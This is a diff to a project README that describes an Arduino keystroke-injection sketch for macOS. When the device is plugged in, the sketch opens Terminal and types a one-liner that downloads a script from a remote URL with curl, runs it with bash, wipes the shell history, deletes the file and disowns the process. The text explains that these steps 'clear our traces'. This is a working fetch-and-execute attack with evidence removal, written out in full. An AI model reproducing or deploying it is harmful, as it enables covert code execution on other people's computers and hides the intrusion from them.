@@ -5,4 +5,4 @@
 
 <br>
 
-**script_runner_mac.ino:** Once plugged in, it hits cmd+space which opens spotlight. Then it types `Terminal.app` and hits enter to open up the terminal application. Then it types out `"$( curl "[url]" > $TMPDIR/16691615; bash $TMPDIR/16691615; history -c; rm ~/.bash_history;rm $TMPDIR/16691615 )" & disown;`, and then it quits the terminal by 
+**script_runner_mac.ino:** Once plugged in, it hits cmd+space which opens spotlight. Then it types `Terminal.app` and hits enter to open up the terminal application. Then it types out `"$( curl "[url]" > $TMPDIR/16691615; bash $TMPDIR/16691615; history -c; rm ~/.bash_history;rm $TMPDIR/16691615 )" & disown;`, and then it quits the terminal by hitting command+q and then enter (it hits enter because of the "Do you want to terminate the processes in this window" prompt). Here, `curl "[url]" > $TMPDIR/16691615` saved the script to a file, `bash $TMPDIR/16691615` executed the file, `history -c`, `rm ~/.bash_history`, `rm $TMPDIR/16691615` clear our traces, and `& disown` ensures that these processes keep running even if the terminal is exited
